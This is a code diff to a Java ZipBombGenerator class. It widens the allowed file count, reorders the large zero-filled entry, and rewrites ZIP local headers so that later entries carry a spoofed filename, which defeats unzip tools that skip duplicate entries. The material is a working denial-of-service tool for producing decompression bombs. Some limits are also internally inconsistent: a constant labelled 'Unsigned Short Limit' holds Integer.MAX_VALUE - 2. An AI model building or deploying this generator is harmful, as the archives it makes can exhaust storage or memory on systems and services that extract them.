@@ -15,9 +15,11 @@ import java.util.zip.ZipOutputStream;
 
 public class ZipBombGenerator {
 
+    public static final int FILE_AMOUNT_LIMIT = Integer.MAX_VALUE - 2;
+
     public static class Builder {
         private final Function<Integer, String> fileName;
-        private final short filesAmount;
+        private final int filesAmount;
         private final int fileSize;
         private String fakeEntryName = null;
 
@@ -25,12 +27,15 @@ public class ZipBombGenerator {
          * Create a ZipBomb generator builder config..
          * @param fileName What will the file name be? Some unzip tools will avoid duplicated entries, so having a function that
          *                 generates unique file names is better.
-         * @param filesAmount How many files should be added?
+         * @param filesAmount How many files should be added? The max value is FILE_AMOUNT_LIMIT  (Unsigned Short Limit)
          * @param fileSize How large a single file will be? The max value is {@link Integer#MAX_VALUE} - 2
          */
-        public Builder(Function<Integer, String> fileName, short filesAmount, int fileSize) {
+        public Builder(Function<Integer, String> fileName, int filesAmount, int fileSize) {
             if (fileSize >= Integer.MAX_VALUE - 1) {
                 throw new IllegalArgumentException("File size too large! Max value: Integer.MAX_VALUE - 2 (JVM Array Size Limit)");
+            }
+            if (filesAmount > FILE_AMOUNT_LIMIT) {
+                throw new IllegalArgumentException("Files amount large! Max value: " + FILE_AMOUNT_LIMIT + " (Zip Limit)");
             }
             this.fileName = fileName;
             this.filesAmount = filesAmount;
@@ -70,9 +75,12 @@ public class ZipBombGenerator {
      * @param filesAmount How many files should be added?
      * @param fileSize How large a single file will be? The max value is {@link Integer#MAX_VALUE} - 2
      */
-    public ZipBombGenerator(Function<Integer, String> fileName, short filesAmount, int fileSize) {
+    public ZipBombGenerator(Function<Integer, String> fileName, int filesAmount, int fileSize) {
         if (fileSize >= Integer.MAX_VALUE) {
             throw new IllegalArgumentException("File size too large! Max value: Integer.MAX_VALUE - 2 (JVM Array Size Limit)");
+        }
+        if (filesAmount > FILE_AMOUNT_LIMIT) {
+            throw new IllegalArgumentException("Files amount large! Max value: " + FILE_AMOUNT_LIMIT + " (Zip Limit)");
         }
         this.fileName = fileName;
         this.filesAmount = filesAmount;
@@ -86,8 +94,8 @@ public class ZipBombGenerator {
      */
     public byte[] create(Map<ZipEntry, byte[]> entries) throws IOException {
         // Argument Check
-        if (filesAmount + entries.size() > Short.MAX_VALUE) {
-            throw new IllegalArgumentException("Too many files to add! Max files amount: " + Short.MAX_VALUE + " but got " + (filesAmount + entries.size()));
+        if (filesAmount + entries.size() > FILE_AMOUNT_LIMIT) {
+            throw new IllegalArgumentException("Too many files to add! Max files amount: " + FILE_AMOUNT_LIMIT + " but got " + (filesAmount + entries.size()));
         }
         String addedFileName = this.fileName.apply(0);
 
@@ -97,7 +105,9 @@ public class ZipBombGenerator {
 
         out.setLevel(Deflater.BEST_COMPRESSION); // Decrease the file size
 
-
+        out.putNextEntry(new ZipEntry(addedFileName));
+        out.write(new byte[fileSize]);
+        out.closeEntry();
         for (Map.Entry<ZipEntry, byte[]> entry : entries.entrySet()) {
             if (entry.getKey().getName().equals(addedFileName)) {
                 throw new IllegalArgumentException("Generated file name is already used in the zip file. (" + addedFileName + ")");
@@ -106,10 +116,6 @@ public class ZipBombGenerator {
             out.write(entry.getValue());
             out.closeEntry();
         }
-
-        out.putNextEntry(new ZipEntry(addedFileName));
-        out.write(new byte[fileSize]);
-        out.closeEntry();
         out.close();
         byte[] input = byteBuffer.toByteArray();
         List<Byte> output = new ArrayList<>();
@@ -125,6 +131,7 @@ public class ZipBombGenerator {
         int offset = 0;
         int addedLength = 0;
         int reducedLocalHeadersLength = 0;
+        int lhIndex = 0;
 
         while (true) {
             if (offset == input.length) {
@@ -137,23 +144,33 @@ public class ZipBombGenerator {
 
             if (offset + 4 < input.length) {
                 if (input[offset] == 0x50 && input[offset + 1] == 0x4B && input[offset + 2] == 0x03 && input[offset + 3] == 0x04) {
-                    int fileNameLength = input[offset + 26] | input[offset + 27] << 8;
-                    byte[] fakeFileName = fakeEntryName.getBytes(StandardCharsets.UTF_8);
-                    int fakeFileNameLength = fakeFileName.length;
-                    int extraFieldLength = input[offset + 28] | input[offset + 29] << 8;
-                    output.addAll(inputList.subList(offset, offset + 26));
-                    output.add((byte) (fakeFileNameLength));
-                    output.add((byte) (fakeFileNameLength >> 8));
-//                    output.add((byte) 0x01);
-//                    output.add((byte) 0x00);
-                    output.addAll(inputList.subList(offset + 28, offset + 30));
-                    for (int i = 0; i < fakeFileNameLength; i++) {
-                        output.add(fakeFileName[i]);
+                    if (fakeEntryName != null) {
+                        lhIndex++;
+                        int fileNameLength = input[offset + 26] | input[offset + 27] << 8;
+                        byte[] realFileName = new byte[fileNameLength];
+                        List<Byte> bytes = inputList.subList(offset + 30, offset + 30 + fileNameLength);
+                        for (int i = 0; i < bytes.size(); i++) {
+                            realFileName[i] = bytes.get(i);
+                        }
+                        byte[] fakeFileName = fakeEntryName.getBytes(StandardCharsets.UTF_8);
+
+                        if (lhIndex == 1) {
+                            fakeFileName = realFileName;
+                        }
+                        int fakeFileNameLength = fakeFileName.length;
+                        int extraFieldLength = input[offset + 28] | input[offset + 29] << 8;
+                        output.addAll(inputList.subList(offset, offset + 26));
+                        output.add((byte) (fakeFileNameLength));
+                        output.add((byte) (fakeFileNameLength >> 8));
+                        output.addAll(inputList.subList(offset + 28, offset + 30));
+                        for (int i = 0; i < fakeFileNameLength; i++) {
+                            output.add(fakeFileName[i]);
+                        }
+                        output.addAll(inputList.subList(offset + 30 + fileNameLength, offset + 30 + fileNameLength + extraFieldLength));
+                        offset += 30 + fileNameLength + extraFieldLength;
+                        reducedLocalHeadersLength += (fileNameLength - fakeFileNameLength);
+                        continue;
                     }
-                    output.addAll(inputList.subList(offset + 30 + fileNameLength, offset + 30 + fileNameLength + extraFieldLength));
-                    offset += 30 + fileNameLength + extraFieldLength;
-                    reducedLocalHeadersLength += (fileNameLength - fakeFileNameLength);
-                    continue;
                 }
                 if (input[offset] == 0x50 && input[offset + 1] == 0x4B && input[offset + 2] == 0x05 && input[offset + 3] == 0x06) {
                     int entriesCountA = ByteBuffer.wrap(new byte[] {input[offset + 9], input[offset + 8]}).getShort();
